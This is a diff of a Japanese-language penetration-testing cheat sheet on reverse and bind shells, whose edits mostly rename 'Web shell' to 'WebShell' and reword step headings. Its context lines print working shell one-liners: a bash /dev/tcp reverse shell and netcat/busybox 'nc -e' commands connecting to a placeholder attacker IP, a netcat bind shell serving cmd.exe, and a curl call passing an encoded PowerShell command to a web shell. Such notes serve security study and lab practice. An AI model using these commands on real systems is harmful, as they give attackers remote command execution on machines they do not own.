@@ -111,7 +111,7 @@ chmod +x /tmp/revshell.sh
 /tmp/revshell.sh
 ```
 
-方法②：ワンライナー（Web shellや、OSコマンドインジェクションでよく使う）
+方法②：ワンライナー（WebShellや、OSコマンドインジェクションでよく使う）
 ```zsh
 bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'
 ```
@@ -148,11 +148,12 @@ busybox nc <attacker_IP> <Port> -e sh
 
 実践ではほとんど使わない
 
-1. ターゲットマシン上で
+1. ターゲットマシン上リスターを用意
 ```cmd
 nc -lvnp <Port> -e "cmd.exe"
 ```
-2. 攻撃者のマシン上で
+
+2. 攻撃者のマシン上からターゲットに接続
 ```zsh
 nc <target_IP> <Port>
 ```
@@ -199,7 +200,7 @@ $EncodedText
 exit
 ```
 
-5. ターゲットマシンの環境のシェル上(Web shell等)で実行する
+5. ターゲットマシンの環境のシェル上(WebShell等)で実行する
 ```zsh
 # WebShellの例
 curl http://example.com/shell.php?cmd=powershell -enc '<$EncodedTextの中身>'
@@ -216,7 +217,7 @@ nc -e cmd.exe <attacker_IP> <Port>
 ---
 ---
 
-# Web Shell
+# WebShell
 
 - [[WebShell]]
 
